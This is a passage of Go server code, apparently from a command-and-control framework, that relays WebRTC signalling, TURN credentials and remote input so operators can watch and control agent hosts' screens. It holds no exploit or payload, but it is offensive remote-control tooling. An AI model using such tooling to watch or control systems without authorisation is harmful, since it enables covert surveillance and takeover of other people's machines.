package server

// Real-time remote desktop over WebRTC.
//
// The browser is the offerer (recvonly video), the agent is the answerer
// (sendonly H.264). Media flows directly or through the embedded Pion TURN
// relay; it never touches the C2 HTTP server. Control events stay on the
// authenticated operator WebSocket and are forwarded to the agent's
// single-use signaling socket so the server keeps rate limiting and audit.
//
// Lifetime: POST /agents/:id/webrtc/start creates one session per agent and
// queues a screen_webrtc_start task carrying the one-shot signaling token and
// TURN credentials. The operator connects to /ws/rd/operator?session=..., the
// agent to /ws/rd/agent?session=...&token=...&agent=.... If either side
// disconnects, the session ends and the agent tears down ffmpeg.

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/pkg/protocol"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/pion/logging"
	"github.com/pion/turn/v4"
)

const (
	webrtcAwaitAgent       = 90 * time.Second
	webrtcMaxSignalBytes   = 512 * 1024
	webrtcMaxPendingFrames = 128
	webrtcDefaultTTL       = time.Hour
	webrtcMaxTTL           = 24 * time.Hour
	webrtcTurnCredSlack    = 5 * time.Minute
)

var errWebRTCDisabled = errors.New("WebRTC is disabled (set webrtc.enabled: true in config.yaml)")

// webrtcStartOptions is the media shape requested by the operator. The server
// validates it before it reaches the agent; dimensions are capped at 1080p.
type webrtcStartOptions struct {
	Width       int    `json:"width"`
	Height      int    `json:"height"`
	FPS         int    `json:"fps"`
	BitrateKbps int    `json:"bitrate_kbps"`
	Encoder     string `json:"encoder"`
}

// webrtcIceServer mirrors the browser RTCIceServer shape and Pion's
// webrtc.ICEServer JSON shape closely enough to pass it through.
type webrtcIceServer struct {
	URLs       []string `json:"urls"`
	Username   string   `json:"username,omitempty"`
	Credential string   `json:"credential,omitempty"`
}

// webrtcAgentStartData is the encrypted task payload. The token is single-use
// and is never returned to the browser.
type webrtcAgentStartData struct {
	SessionID  string             `json:"session_id"`
	Token      string             `json:"token"`
	AgentID    string             `json:"agent_id"`
	Path       string             `json:"path"`
	IceServers []webrtcIceServer  `json:"ice_servers"`
	Settings   webrtcStartOptions `json:"settings"`
}

type webrtcStartResponse struct {
	SessionID  string             `json:"session_id"`
	AgentID    string             `json:"agent_id"`
	IceServers []webrtcIceServer  `json:"ice_servers"`
	Settings   webrtcStartOptions `json:"settings"`
	ExpiresAt  time.Time          `json:"expires_at"`
}

type turnCredential struct {
	password string
	expires  time.Time
}

// webrtcSession is one live desktop. Conn pointers and pending frames are
// guarded by mu; writes use the per-side mutex because gorilla permits only
// one concurrent writer per connection.
type webrtcSession struct {
	hub        *webrtcHub
	ID         string
	AgentID    string
	OperatorID uint
	TenantID   uint
	Settings   webrtcStartOptions
	TokenHash  string
	TurnUser   string
	TurnPass   string
	CreatedAt  time.Time
	ExpiresAt  time.Time

	mu       sync.Mutex
	operator *websocket.Conn
	agent    *websocket.Conn
	pending  [][]byte
	ended    bool

	opWriteMu    sync.Mutex
	agentWriteMu sync.Mutex

	awaitTimer *time.Timer
	maxTimer   *time.Timer
	endOnce    sync.Once
}

func (s *webrtcSession) sendToOperator(v any) bool {
	raw, err := json.Marshal(v)
	if err != nil {
		return false
	}
	return s.sendRawToOperator(raw)
}

func (s *webrtcSession) sendRawToOperator(raw []byte) bool {
	s.mu.Lock()
	conn := s.operator
	ended := s.ended
	s.mu.Unlock()
	if conn == nil || ended {
		return false
	}
	s.opWriteMu.Lock()
	defer s.opWriteMu.Unlock()
	_ = conn.SetWriteDeadline(time.Now().Add(OperatorWriteDeadline))
	return conn.WriteMessage(websocket.TextMessage, raw) == nil
}

// sendToAgent buffers signaling frames until the agent connects. The buffer
// is bounded; an operator that floods candidates before the agent shows up is
// disconnected rather than allowed to pin memory.
func (s *webrtcSession) sendRawToAgent(raw []byte) bool {
	s.mu.Lock()
	if s.ended {
		s.mu.Unlock()
		return false
	}
	if s.agent == nil {
		if len(s.pending) >= webrtcMaxPendingFrames {
			s.mu.Unlock()
			s.end("agent_signaling_buffer_full")
			return false
		}
		s.pending = append(s.pending, append([]byte(nil), raw...))
		s.mu.Unlock()
		return true
	}
	s.mu.Unlock()

	s.agentWriteMu.Lock()
	defer s.agentWriteMu.Unlock()
	s.mu.Lock()
	conn := s.agent
	ended := s.ended
	s.mu.Unlock()
	if conn == nil || ended {
		return false
	}
	_ = conn.SetWriteDeadline(time.Now().Add(OperatorWriteDeadline))
	return conn.WriteMessage(websocket.TextMessage, raw) == nil
}

// attachOperator installs the operator socket and reports whether THIS attach
// succeeded. It deliberately does not report agent readiness: the caller used to
// treat the returned bool as "attached", so whenever the browser connected
// before the agent's signaling socket (the normal order — the operator dials as
// soon as it has the session, the agent attaches after a round trip) the
// operator socket was closed immediately and remote desktop never worked.
// Readiness is queried separately with agentAttached.
func (s *webrtcSession) attachOperator(conn *websocket.Conn) bool {
	s.mu.Lock()
	if s.operator != nil || s.ended {
		s.mu.Unlock()
		return false
	}
	s.operator = conn
	s.mu.Unlock()
	s.stopAwaitTimerIfReady()
	return true
}

// peersReady reports whether both sides of the signaling channel are present.
func (s *webrtcSession) peersReady() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.operator != nil && s.agent != nil
}

func (s *webrtcSession) stopAwaitTimerIfReady() {
	if s.peersReady() && s.awaitTimer != nil {
		s.awaitTimer.Stop()
	}
}

func (s *webrtcSession) attachAgent(conn *websocket.Conn) ([][]byte, bool) {
	// Hold agentWriteMu across installing the conn and flushing so no
	// concurrently relayed frame can overtake the buffered offer.
	s.agentWriteMu.Lock()
	defer s.agentWriteMu.Unlock()
	s.mu.Lock()
	if s.agent != nil || s.ended {
		s.mu.Unlock()
		return nil, false
	}
	s.agent = conn
	pending := s.pending
	s.pending = nil
	s.mu.Unlock()
	for _, raw := range pending {
		_ = conn.SetWriteDeadline(time.Now().Add(OperatorWriteDeadline))
		if err := conn.WriteMessage(websocket.TextMessage, raw); err != nil {
			return pending, false
		}
	}
	s.stopAwaitTimerIfReady()
	return pending, true
}

func (s *webrtcSession) agentAttached() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.agent != nil
}

// end tears down both sockets exactly once and removes the session from the
// hub. It is safe to call from either read loop or a timer.
func (s *webrtcSession) end(reason string) {
	s.endOnce.Do(func() {
		s.mu.Lock()
		s.ended = true
		op := s.operator
		ag := s.agent
		s.operator = nil
		s.agent = nil
		s.pending = nil
		s.mu.Unlock()
		if s.awaitTimer != nil {
			s.awaitTimer.Stop()
		}
		if s.maxTimer != nil {
			s.maxTimer.Stop()
		}
		s.hub.remove(s)

		endMsg, _ := json.Marshal(gin.H{"type": "session_end", "reason": reason})
		if op != nil {
			s.opWriteMu.Lock()
			_ = op.SetWriteDeadline(time.Now().Add(OperatorWriteDeadline))
			_ = op.WriteMessage(websocket.TextMessage, endMsg)
			s.opWriteMu.Unlock()
			_ = op.Close()
		}
		if ag != nil {
			s.agentWriteMu.Lock()
			_ = ag.SetWriteDeadline(time.Now().Add(OperatorWriteDeadline))
			_ = ag.WriteMessage(websocket.TextMessage, endMsg)
			s.agentWriteMu.Unlock()
			_ = ag.Close()
		}
		slog.Info("WebRTC session ended", "session_id", s.ID, "agent_id", s.AgentID, "reason", reason)
	})
}

type webrtcHub struct {
	cfg *config.Config

	mu       sync.Mutex
	sessions map[string]*webrtcSession
	byAgent  map[string]*webrtcSession
	byToken  map[string]*webrtcSession
	turn     map[string]turnCredential

	turnMu       sync.Mutex
	turnServer   *turn.Server
	turnErr      error
	turnPublicIP string
	turnPort     string
}

func newWebRTCHub(cfg *config.Config) *webrtcHub {
	return &webrtcHub{
		cfg:      cfg,
		sessions: make(map[string]*webrtcSession),
		byAgent:  make(map[string]*webrtcSession),
		byToken:  make(map[string]*webrtcSession),
		turn:     make(map[string]turnCredential),
	}
}

func randomToken(n int) (string, error) {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return "", err
	}
	return base64.RawURLEncoding.EncodeToString(b), nil
}

func hashToken(token string) string {
	sum := sha256.Sum256([]byte(token))
	return hex.EncodeToString(sum[:])
}

func (h *webrtcHub) createSession(agentID string, operatorID, tenantID uint, settings webrtcStartOptions, ttl time.Duration) (*webrtcSession, string, error) {
	sessionID, err := randomToken(16)
	if err != nil {
		return nil, "", err
	}
	token, err := randomToken(32)
	if err != nil {
		return nil, "", err
	}
	turnPass, err := randomToken(24)
	if err != nil {
		return nil, "", err
	}
	if ttl <= 0 {
		ttl = webrtcDefaultTTL
	}
	if ttl > webrtcMaxTTL {
		ttl = webrtcMaxTTL
	}
	now := time.Now()
	sess := &webrtcSession{
		hub:        h,
		ID:         sessionID,
		AgentID:    agentID,
		OperatorID: operatorID,
		TenantID:   tenantID,
		Settings:   settings,
		TokenHash:  hashToken(token),
		TurnUser:   "fc2_" + sessionID,
		TurnPass:   turnPass,
		CreatedAt:  now,
		ExpiresAt:  now.Add(ttl),
	}

	h.mu.Lock()
	if existing := h.byAgent[agentID]; existing != nil {
		h.mu.Unlock()
		return nil, "", fmt.Errorf("agent already has a live WebRTC session")
	}
	maxSessions := h.cfg.WebRTC.MaxSessions
	if maxSessions <= 0 {
		maxSessions = 32
	}
	if len(h.sessions) >= maxSessions {
		h.mu.Unlock()
		return nil, "", fmt.Errorf("WebRTC session limit reached (%d)", maxSessions)
	}
	h.sessions[sessionID] = sess
	h.byAgent[agentID] = sess
	h.byToken[sess.TokenHash] = sess
	h.turn[sess.TurnUser] = turnCredential{password: turnPass, expires: sess.ExpiresAt.Add(webrtcTurnCredSlack)}
	// Assign the timers before publishing (unlocking) the session: a fast
	// operator/agent attach reads them without s.mu, so assigning after the
	// map insert would be a data race. A timer can fire while h.mu is still
	// held; end() only blocks on h.mu inside remove() until createSession
	// unlocks, which is safe.
	sess.awaitTimer = time.AfterFunc(webrtcAwaitAgent, func() {
		if !sess.peersReady() {
			sess.end("peer_timeout")
		}
	})
	sess.maxTimer = time.AfterFunc(ttl, func() { sess.end("session_expired") })
	h.mu.Unlock()
	return sess, token, nil
}

func (h *webrtcHub) remove(s *webrtcSession) {
	h.mu.Lock()
	if h.sessions[s.ID] == s {
		delete(h.sessions, s.ID)
	}
	if h.byAgent[s.AgentID] == s {
		delete(h.byAgent, s.AgentID)
	}
	if h.byToken[s.TokenHash] == s {
		delete(h.byToken, s.TokenHash)
	}
	delete(h.turn, s.TurnUser)
	h.mu.Unlock()
}

func (h *webrtcHub) byAgentSession(agentID string) *webrtcSession {
	h.mu.Lock()
	defer h.mu.Unlock()
	return h.byAgent[agentID]
}

func (h *webrtcHub) sessionForOperator(sessionID string, operatorID uint) (*webrtcSession, error) {
	h.mu.Lock()
	s := h.sessions[sessionID]
	h.mu.Unlock()
	if s == nil {
		return nil, errors.New("WebRTC session not found")
	}
	s.mu.Lock()
	ended := s.ended
	s.mu.Unlock()
	if ended {
		return nil, errors.New("WebRTC session not found")
	}
	if s.OperatorID != operatorID {
		return nil, errors.New("WebRTC session belongs to another operator")
	}
	if time.Now().After(s.ExpiresAt) {
		return nil, errors.New("WebRTC session expired")
	}
	return s, nil
}

// authenticateAgent consumes the one-shot token and returns the session. A
// failed agent-id match still consumes the token: the token is deliberately
// single-use and a mismatch is an attack signal, not a retry.
func (h *webrtcHub) authenticateAgent(sessionID, token, agentID string) (*webrtcSession, error) {
	hash := hashToken(token)
	h.mu.Lock()
	s := h.sessions[sessionID]
	if s == nil {
		h.mu.Unlock()
		return nil, errors.New("WebRTC session not found")
	}
	if time.Now().After(s.ExpiresAt) {
		h.mu.Unlock()
		return nil, errors.New("WebRTC session expired")
	}
	bound, ok := h.byToken[hash]
	if !ok || bound != s || s.TokenHash != hash {
		h.mu.Unlock()
		return nil, errors.New("invalid WebRTC signaling token")
	}
	delete(h.byToken, hash)
	h.mu.Unlock()

	s.mu.Lock()
	ended := s.ended
	s.mu.Unlock()
	if ended {
		return nil, errors.New("WebRTC session not found")
	}
	if agentID != "" && !strings.EqualFold(agentID, s.AgentID) {
		return nil, errors.New("WebRTC token is bound to a different agent")
	}
	return s, nil
}

// turnRealm returns the realm configured for the embedded TURN server, using
// the same fallback as ensureTURN. Keeping one helper prevents an empty YAML
// realm from making the auth key disagree with the realm Pion advertises.
func (h *webrtcHub) turnRealm() string {
	if h.cfg == nil {
		return "forgec2"
	}
	realm := strings.TrimSpace(h.cfg.WebRTC.Realm)
	if realm == "" {
		return "forgec2"
	}
	return realm
}

func (h *webrtcHub) authenticateTURN(username, realm string) ([]byte, bool) {
	effectiveRealm := h.turnRealm()
	if realm != "" && realm != effectiveRealm {
		return nil, false
	}
	h.mu.Lock()
	cred, ok := h.turn[username]
	h.mu.Unlock()
	if !ok || time.Now().After(cred.expires) {
		return nil, false
	}
	return turn.GenerateAuthKey(username, effectiveRealm, cred.password), true
}

// ensureTURN starts the embedded TURN listener once. The listener is UDP-only
// in the first pass; an operator behind a UDP-blocking network can still use
// direct host candidates when both peers are reachable.
func (h *webrtcHub) ensureTURN() error {
	if h.cfg == nil || !h.cfg.WebRTC.Enabled {
		return errWebRTCDisabled
	}
	h.turnMu.Lock()
	defer h.turnMu.Unlock()
	if h.turnServer != nil {
		return nil
	}
	if h.turnErr != nil {
		return h.turnErr
	}
	addr := strings.TrimSpace(h.cfg.WebRTC.TurnAddr)
	if addr == "" {
		addr = ":3478"
	}
	pc, err := net.ListenPacket("udp", addr)
	if err != nil {
		h.turnErr = fmt.Errorf("TURN listen %s: %w", addr, err)
		return h.turnErr
	}
	publicIP := strings.TrimSpace(h.cfg.WebRTC.PublicIP)
	if publicIP == "" {
		publicIP = detectLocalIPv4()
	}
	relayIP := net.ParseIP(publicIP)
	if relayIP == nil {
		_ = pc.Close()
		h.turnErr = fmt.Errorf("invalid webrtc.public_ip %q", publicIP)
		return h.turnErr
	}
	port := "3478"
	if _, p, splitErr := net.SplitHostPort(addr); splitErr == nil && p != "" {
		port = p
	}
	realm := h.turnRealm()
	minPort := h.cfg.WebRTC.RelayMinPort
	maxPort := h.cfg.WebRTC.RelayMaxPort
	if minPort <= 0 || maxPort <= 0 || minPort > maxPort {
		minPort, maxPort = 49152, 65535
	}
	factory := logging.NewDefaultLoggerFactory()
	factory.DefaultLogLevel = logging.LogLevelError
	srv, err := turn.NewServer(turn.ServerConfig{
		Realm:         realm,
		LoggerFactory: factory,
		AuthHandler: func(username, turnRealm string, _ net.Addr) ([]byte, bool) {
			return h.authenticateTURN(username, turnRealm)
		},
		PacketConnConfigs: []turn.PacketConnConfig{{
			PacketConn: pc,
			RelayAddressGenerator: &turn.RelayAddressGeneratorPortRange{
				RelayAddress: relayIP,
				Address:      "0.0.0.0",
				MinPort:      uint16(minPort),
				MaxPort:      uint16(maxPort),
			},
		}},
	})
	if err != nil {
		_ = pc.Close()
		h.turnErr = fmt.Errorf("TURN server: %w", err)
		return h.turnErr
	}
	h.turnServer = srv
	h.turnPublicIP = publicIP
	h.turnPort = port
	slog.Info("Embedded TURN server listening", "addr", addr, "public_ip", publicIP, "realm", realm)
	return nil
}

func (h *webrtcHub) turnURL(c *gin.Context) (string, error) {
	if err := h.ensureTURN(); err != nil {
		return "", err
	}
	h.turnMu.Lock()
	host := h.turnPublicIP
	port := h.turnPort
	h.turnMu.Unlock()
	// Prefer the host the operator actually used: a public hostname may be
	// fronted/proxied and need not equal the relay IP. public_ip remains the
	// fallback when the request has no usable host, and the same Host
	// validation as the one-liner generator applies (an injected value must not
	// reach the ICE server list).
	if reqHost, ok := sanitizeRequestHost(c.Request.Host); ok && reqHost != "" {
		if hostOnly, _, err := net.SplitHostPort(reqHost); err == nil && hostOnly != "" {
			host = hostOnly
		} else {
			host = strings.Trim(reqHost, "[]")
		}
	}
	if port == "" {
		port = "3478"
	}
	return "turn:" + net.JoinHostPort(host, port) + "?transport=udp", nil
}

func (h *webrtcHub) close() {
	h.mu.Lock()
	sessions := make([]*webrtcSession, 0, len(h.sessions))
	for _, s := range h.sessions {
		sessions = append(sessions, s)
	}
	h.mu.Unlock()
	for _, s := range sessions {
		s.end("server_shutdown")
	}
	h.turnMu.Lock()
	srv := h.turnServer
	h.turnServer = nil
	h.turnMu.Unlock()
	if srv != nil {
		_ = srv.Close()
	}
}

func detectLocalIPv4() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, a := range addrs {
		ipnet, ok := a.(*net.IPNet)
		if !ok || ipnet.IP.IsLoopback() {
			continue
		}
		if ip4 := ipnet.IP.To4(); ip4 != nil {
			return ip4.String()
		}
	}
	return "127.0.0.1"
}

// ── HTTP + WebSocket handlers ───────────────────────────────────────────────

func (s *Server) webRTCHub() *webrtcHub {
	s.webrtcInitMu.Lock()
	defer s.webrtcInitMu.Unlock()
	if s.webrtc == nil {
		s.webrtc = newWebRTCHub(s.cfg)
	}
	return s.webrtc
}

type webrtcStartRequest struct {
	Width       int    `json:"width"`
	Height      int    `json:"height"`
	FPS         int    `json:"fps"`
	BitrateKbps int    `json:"bitrate_kbps"`
	Encoder     string `json:"encoder"`
}

func normalizeWebRTCStart(req webrtcStartRequest) (webrtcStartOptions, error) {
	opts := webrtcStartOptions{
		Width:       req.Width,
		Height:      req.Height,
		FPS:         req.FPS,
		BitrateKbps: req.BitrateKbps,
		Encoder:     strings.ToLower(strings.TrimSpace(req.Encoder)),
	}
	if opts.Width == 0 && opts.Height == 0 {
		opts.Width, opts.Height = 1280, 720
	}
	if opts.Width < 640 || opts.Width > 1920 || opts.Height < 360 || opts.Height > 1080 {
		return opts, fmt.Errorf("width must be 640-1920 and height 360-1080 (1080p maximum)")
	}
	if opts.Width%2 != 0 || opts.Height%2 != 0 {
		return opts, errors.New("width and height must be even")
	}
	if opts.FPS == 0 {
		opts.FPS = 30
	}
	if opts.FPS < 15 || opts.FPS > 30 {
		return opts, errors.New("fps must be 15-30")
	}
	if opts.BitrateKbps == 0 {
		if opts.Width*opts.Height > 1280*720 {
			opts.BitrateKbps = 4500
		} else {
			opts.BitrateKbps = 2500
		}
	}
	if opts.BitrateKbps < 500 || opts.BitrateKbps > 8000 {
		return opts, errors.New("bitrate_kbps must be 500-8000")
	}
	switch opts.Encoder {
	case "", "auto", "libx264", "h264_nvenc", "h264_qsv", "h264_amf", "h264_videotoolbox":
	default:
		return opts, errors.New("unsupported encoder (use auto, libx264, h264_nvenc, h264_qsv, h264_amf or h264_videotoolbox)")
	}
	return opts, nil
}

func (s *Server) handleWebRTCStart(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	agent, ok := s.getAgentOrFail(c, id)
	if !ok {
		return
	}
	if agent.Status != "online" {
		respondError(c, http.StatusConflict, "agent is offline")
		return
	}
	if s.IsScreenMonitoring(id) {
		respondError(c, http.StatusConflict, "the still-image screen monitor is active; stop it before starting WebRTC")
		return
	}
	uid, ok := currentUserID(c)
	if !ok {
		respondError(c, http.StatusUnauthorized, "unauthorized")
		return
	}

	var req webrtcStartRequest
	if c.Request.ContentLength > 0 {
		if err := c.ShouldBindJSON(&req); err != nil {
			respondError(c, http.StatusBadRequest, "invalid WebRTC settings")
			return
		}
	}
	opts, err := normalizeWebRTCStart(req)
	if err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}

	hub := s.webRTCHub()
	if hub.cfg == nil || !hub.cfg.WebRTC.Enabled {
		respondError(c, http.StatusServiceUnavailable, errWebRTCDisabled.Error())
		return
	}
	if existing := hub.byAgentSession(id); existing != nil {
		respondError(c, http.StatusConflict, "agent already has a live WebRTC session")
		return
	}
	turnURL, err := hub.turnURL(c)
	if err != nil {
		slog.Error("WebRTC TURN unavailable", "agent_id", id, "err", err)
		respondError(c, http.StatusServiceUnavailable, "WebRTC TURN relay is unavailable: "+err.Error())
		return
	}
	ttl := time.Duration(hub.cfg.WebRTC.SessionTTLSeconds) * time.Second
	if ttl <= 0 {
		ttl = webrtcDefaultTTL
	}
	sess, token, err := hub.createSession(id, uid, agent.TenantID, opts, ttl)
	if err != nil {
		respondError(c, http.StatusConflict, err.Error())
		return
	}

	data := webrtcAgentStartData{
		SessionID: sess.ID,
		Token:     token,
		AgentID:   id,
		Path:      "/ws/rd/agent",
		IceServers: []webrtcIceServer{{
			URLs:       []string{turnURL},
			Username:   sess.TurnUser,
			Credential: sess.TurnPass,
		}},
		Settings: opts,
	}
	rawData, err := json.Marshal(data)
	if err != nil {
		sess.end("task_payload_failed")
		respondError(c, http.StatusInternalServerError, "failed to encode WebRTC task")
		return
	}
	task := s.issueAgentTask(c, id, TaskSpec{
		Type:           protocol.TaskTypeScreenWebRTCSt,
		Data:           string(rawData),
		IdempotencyKey: "webrtc:" + sess.ID,
	})
	if task == nil {
		sess.end("task_create_failed")
		return
	}
	if user, ok := c.Get("user"); ok {
		if username, ok := user.(string); ok && username != "" && task.CreatedBy == "" {
			task.CreatedBy = username
			s.db.Model(task).Update("created_by", username)
		}
	}
	details := fmt.Sprintf("WebRTC session %s started (%dx%d@%d, %dkbps, encoder=%s)", sess.ID, opts.Width, opts.Height, opts.FPS, opts.BitrateKbps, opts.Encoder)
	s.LogAuditRecord(c, "webrtc_start", "agent", id, details, true, nil)
	s.broadcastTaskUpdate(id, *task)
	respond(c, webrtcStartResponse{
		SessionID:  sess.ID,
		AgentID:    id,
		IceServers: data.IceServers,
		Settings:   opts,
		ExpiresAt:  sess.ExpiresAt,
	})
}

func (s *Server) handleWebRTCStop(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	uid, ok := currentUserID(c)
	if !ok {
		respondError(c, http.StatusUnauthorized, "unauthorized")
		return
	}
	// The browser sends the session it is stopping so a delayed fallback stop
	// cannot tear down a newer session on the same agent.
	var req struct {
		SessionID string `json:"session_id"`
	}
	if c.Request.ContentLength > 0 {
		_ = c.ShouldBindJSON(&req) // optional; a malformed body means "current session"
	}
	hub := s.webRTCHub()
	sess := hub.byAgentSession(id)
	if sess == nil {
		respond(c, gin.H{"message": "no active WebRTC session"})
		return
	}
	if req.SessionID != "" && req.SessionID != sess.ID {
		respond(c, gin.H{"message": "the requested WebRTC session is no longer active"})
		return
	}
	if sess.OperatorID != uid {
		respondError(c, http.StatusForbidden, "WebRTC session belongs to another operator")
		return
	}
	sess.end("operator_stop")
	// The signaling socket is authoritative; the stop task is a fallback for
	// agents whose socket died between the request and the teardown.
	task := s.issueAgentTask(c, id, TaskSpec{Type: protocol.TaskTypeScreenWebRTCSp, Data: sess.ID})
	if task == nil {
		return // issueAgentTask already wrote the error response
	}
	s.LogAuditRecord(c, "webrtc_stop", "agent", id, "WebRTC session "+sess.ID+" stopped", true, nil)
	s.broadcastTaskUpdate(id, *task)
	respond(c, gin.H{"session_id": sess.ID})
}

type webrtcSignal struct {
	Type      string              `json:"type"`
	SDP       string              `json:"sdp,omitempty"`
	Candidate json.RawMessage     `json:"candidate,omitempty"`
	Event     *remoteInputRequest `json:"event,omitempty"`
	Reason    string              `json:"reason,omitempty"`
}

func parseWebRTCSignal(raw []byte) (webrtcSignal, error) {
	var msg webrtcSignal
	if len(raw) > webrtcMaxSignalBytes {
		return msg, errors.New("signaling message too large")
	}
	if err := json.Unmarshal(raw, &msg); err != nil {
		return msg, errors.New("invalid signaling JSON")
	}
	msg.Type = strings.ToLower(strings.TrimSpace(msg.Type))
	return msg, nil
}

func (s *Server) handleRDWebRTCSignal(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	uid, ok := currentUserID(c)
	if !ok {
		respondError(c, http.StatusUnauthorized, "unauthorized")
		return
	}
	sessionID := strings.TrimSpace(c.Query("session"))
	if sessionID == "" {
		respondError(c, http.StatusBadRequest, "session required")
		return
	}
	hub := s.webRTCHub()
	sess, err := hub.sessionForOperator(sessionID, uid)
	if err != nil {
		respondError(c, http.StatusNotFound, err.Error())
		return
	}
	if _, ok := s.getAgentOrFail(c, sess.AgentID); !ok {
		return
	}
	if origin := c.GetHeader("Origin"); origin != "" && !s.wsUpgrader.CheckOrigin(c.Request) {
		respondError(c, http.StatusForbidden, "origin not allowed")
		return
	}
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.Error("WebRTC operator upgrade failed", "err", err)
		return
	}
	if !sess.attachOperator(conn) {
		_ = conn.Close()
		return
	}
	agentReady := sess.agentAttached()
	if agentReady {
		sess.sendToOperator(gin.H{"type": "agent_ready", "session_id": sess.ID})
	} else {
		sess.sendToOperator(gin.H{"type": "waiting", "session_id": sess.ID})
	}
	s.LogAuditRecord(c, "webrtc_open", "agent", sess.AgentID, "WebRTC operator stream opened ("+sess.ID+")", true, nil)
	defer func() {
		sess.end("operator_closed")
		s.LogAuditRecord(c, "webrtc_close", "agent", sess.AgentID, "WebRTC operator stream closed ("+sess.ID+")", true, nil)
	}()

	conn.SetReadLimit(webrtcMaxSignalBytes)
	conn.SetReadDeadline(time.Now().Add(RemoteDesktopReadDeadline))
	conn.SetPongHandler(func(string) error {
		return conn.SetReadDeadline(time.Now().Add(RemoteDesktopReadDeadline))
	})
	pingDone := make(chan struct{})
	defer close(pingDone)
	go func() {
		ticker := time.NewTicker(RemoteDesktopPingInterval)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				_ = conn.WriteControl(websocket.PingMessage, nil, time.Now().Add(RemoteDesktopWriteDeadline))
			case <-pingDone:
				return
			}
		}
	}()

	for {
		_, raw, err := conn.ReadMessage()
		if err != nil {
			return
		}
		_ = conn.SetReadDeadline(time.Now().Add(RemoteDesktopReadDeadline))
		msg, err := parseWebRTCSignal(raw)
		if err != nil {
			sess.sendToOperator(gin.H{"type": "error", "error": err.Error()})
			continue
		}
		switch msg.Type {
		case "offer":
			if strings.TrimSpace(msg.SDP) == "" || len(msg.SDP) > 256*1024 {
				sess.sendToOperator(gin.H{"type": "error", "error": "invalid offer"})
				continue
			}
			if !sess.agentAttached() {
				// Keep the browser informed while the task travels to the
				// agent; the offer stays buffered server-side.
				sess.sendToOperator(gin.H{"type": "waiting", "session_id": sess.ID})
			}
			if !sess.sendRawToAgent(raw) {
				return
			}
		case "ice":
			if len(msg.Candidate) == 0 || len(msg.Candidate) > 8192 {
				sess.sendToOperator(gin.H{"type": "error", "error": "invalid ICE candidate"})
				continue
			}
			if !sess.sendRawToAgent(raw) {
				return
			}
		case "input":
			if msg.Event == nil || !sess.agentAttached() {
				// Input before the agent's signaling socket is attached would
				// only sit in the pre-agent buffer; drop it instead.
				continue
			}
			event := *msg.Event
			if err := event.normalize(); err != nil {
				continue
			}
			if !s.remoteInputLimiter.allow("webrtc:"+strconv.FormatUint(uint64(uid), 10)+":"+strings.ToLower(sess.AgentID),
				MaxRemoteInputEventsPerWindow, RemoteInputWindow, time.Now()) {
				continue
			}
			payload, err := json.Marshal(event)
			if err != nil {
				continue
			}
			forward, _ := json.Marshal(gin.H{"type": "input", "event": json.RawMessage(payload)})
			if !sess.sendRawToAgent(forward) {
				return
			}
		case "stop":
			sess.end("operator_stop")
			return
		case "ping":
			sess.sendToOperator(gin.H{"type": "pong"})
		default:
			sess.sendToOperator(gin.H{"type": "error", "error": "unsupported signaling message"})
		}
	}
}

func (s *Server) handleRDWebRTCAgent(c *gin.Context) {
	sessionID := strings.TrimSpace(c.Query("session"))
	token := strings.TrimSpace(c.Query("token"))
	agentID := strings.TrimSpace(c.Query("agent"))
	if sessionID == "" || token == "" {
		respondError(c, http.StatusBadRequest, "session and token required")
		return
	}
	hub := s.webRTCHub()
	sess, err := hub.authenticateAgent(sessionID, token, agentID)
	if err != nil {
		respondError(c, http.StatusUnauthorized, err.Error())
		return
	}
	if sess.agentAttached() {
		sess.end("duplicate_agent_socket")
		respondError(c, http.StatusConflict, "WebRTC session already has an agent")
		return
	}
	conn, err := s.wsUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		sess.end("agent_upgrade_failed")
		return
	}
	if _, ok := sess.attachAgent(conn); !ok {
		_ = conn.Close()
		sess.end("agent_attach_failed")
		return
	}
	sess.sendToOperator(gin.H{"type": "agent_ready", "session_id": sess.ID})
	s.LogAuditRecord(c, "webrtc_agent_connect", "agent", sess.AgentID, "WebRTC agent signaling connected ("+sess.ID+")", true, nil)
	defer sess.end("agent_closed")

	conn.SetReadLimit(webrtcMaxSignalBytes)
	conn.SetReadDeadline(time.Now().Add(RemoteDesktopReadDeadline))
	conn.SetPongHandler(func(string) error {
		return conn.SetReadDeadline(time.Now().Add(RemoteDesktopReadDeadline))
	})
	pingDone := make(chan struct{})
	defer close(pingDone)
	go func() {
		ticker := time.NewTicker(RemoteDesktopPingInterval)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				_ = conn.WriteControl(websocket.PingMessage, nil, time.Now().Add(RemoteDesktopWriteDeadline))
			case <-pingDone:
				return
			}
		}
	}()

	for {
		_, raw, err := conn.ReadMessage()
		if err != nil {
			return
		}
		_ = conn.SetReadDeadline(time.Now().Add(RemoteDesktopReadDeadline))
		msg, err := parseWebRTCSignal(raw)
		if err != nil {
			continue
		}
		switch msg.Type {
		case "answer":
			if strings.TrimSpace(msg.SDP) == "" || len(msg.SDP) > 256*1024 {
				continue
			}
			sess.sendRawToOperator(raw)
		case "ice":
			if len(msg.Candidate) == 0 || len(msg.Candidate) > 8192 {
				continue
			}
			sess.sendRawToOperator(raw)
		case "state":
			// Agent state is advisory; forward the display/status text.
			sess.sendRawToOperator(raw)
		case "error":
			// Forward the truncated frame, not the raw one: the cap used to be
			// applied to a value that was then discarded, so an agent could
			// relay an error reason up to the whole read limit.
			if len(msg.Reason) > 512 {
